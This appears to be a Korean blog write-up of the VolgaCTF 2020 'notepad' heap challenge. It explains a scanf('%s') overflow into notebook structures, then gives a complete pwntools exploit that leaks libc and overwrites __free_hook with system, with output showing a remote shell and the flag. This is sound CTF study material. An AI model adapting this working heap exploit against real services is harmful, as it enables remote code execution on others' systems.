---
title: volgaCTF notepadd write up
categories: [2020, volga ]
tags: [CTF, linux, heap, baby]
---

volga ctf notepad write up

간만에 보는 쉬운 heap 문제

# analyze
   이 프로그램의 기능은 bss영역에 notebook structure를 만들고 notebook하나를 선택해서 data를 힙에다가 저장하는 프로그램이다.
   data를 힙에 저장하고 나온 return값은 notebook structure안에 있다.

``` c++
int add()
{
  __int64 v1; // rax
  char *v2; // ST08_8

  if ( noteNum == 16 )
    return puts("You've reached the limit for notebooks! Delete some of the older once first!");
  v1 = noteNum++;
  v2 = (char *)&unk_203060 + 0x818 * v1;
  printf("Enter notebook name: ");
  return __isoc99_scanf("%s", v2);__
}
```

   취약점은 notbook을 만드는데 scanf("%s")로 받기 때문에 오버플로우가 발생한다. 때문에 notebook의 structure를 내 맘대로 조절이 가능하다.

# solve
   notebook 2개를 생성후 2번 notebook에 data를 만든다. 그리고 notebook 2번을 지우고 생성하면 notebook 2번의 구조체안을 조절할 수 있다.
   한 data의 길이를 0x1000으로 생성해주고 지운다음에 그 전 data의 길이 영역을 늘려주면 libc leak을 할수가 있다.
   그 후 data의 포인터 값을 `__free_hook`로 바꿔주고 update를 통해서 system의 주소로 바꿔주면 된다.

# ex.py
``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000
else:
    host = "notepad.q.2020.volgactf.ru"
    port = 45678

def menu(index):
    s.recvuntil("> ")
    s.sendline(str(index))

def sendpay(pay):
    s.recvuntil(": ")
    s.sendline(pay)

def addNote(name):
    menu('a')
    sendpay(name)

def delete(index):
    menu('d')
    sendpay(str(index))

def update(index, name, length, data):
    menu('u')
    sendpay(str(index))
    sendpay(name)
    sendpay(str(length))
    sendpay(data)

def view(index):
    menu('v')
    sendpay(str(index))

def pick(index):
    menu('p')
    sendpay(str(index))

def addTab(name, length, data):
    menu('a')
    sendpay(name)
    sendpay(str(length))
    sendpay(data)

def pwn():
    addNote("powerprove_1")
    addNote("powerprove_2")
    pick(2)
    addTab("tab1", 20, "tab1")
    addTab("tab2", 0x1000, "tab2")
    addTab('tab3', 20, "/bin/sh\x00")
    delete(2)
    menu('q')

    delete(1)
    fakeNote = "A"*0x10
    fakeNote += p64(3)
    fakeNote += "B"*0x10
    fakeNote += p64(0x1000)
    addNote(fakeNote[:-1])

    pick(2)
    view(1)
    s.recv(0x20)
    libc_base = u64(s.recv(8)) - 0x1e4ca0 - 0x207000
    free_hook = libc_base + 0x3ed8e8
    system_addr = libc_base + 0x04f440
    log.info("libc_base        : " + str(hex(libc_base)))
    log.info("free_hook        : " + str(hex(free_hook)))
    log.info("system_addr      : " + str(hex(system_addr)))
    menu('q')

    delete(1)
    fakeNote = "A"*0x10
    fakeNote += p64(3)
    fakeNote += "B"*0x10
    fakeNote += p64(0x1000)
    fakeNote += p64(free_hook) # 0x1e5960
    addNote(fakeNote[:-1])

    pick(2)
    update(1, "/bin/sh\x00", "9\x00", p64(system_addr))
    delete(2)

if __name__ == "__main__":
    s = remote(host, port)
    pwn()
    s.interactive()
```
# result
``` sh
➜  notepadd python ex.py r
[+] Opening connection to notepad.q.2020.volgactf.ru on port 45678: Done
[*] libc_base        : 0x7f2c5dba7000
[*] free_hook        : 0x7f2c5df948e8
[*] system_addr      : 0x7f2c5dbf6440
[*] Switching to interactive mode
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat flag.txt
VolgaCTF{i5_g1ibc_mall0c_irr3p@rable?}
$
```
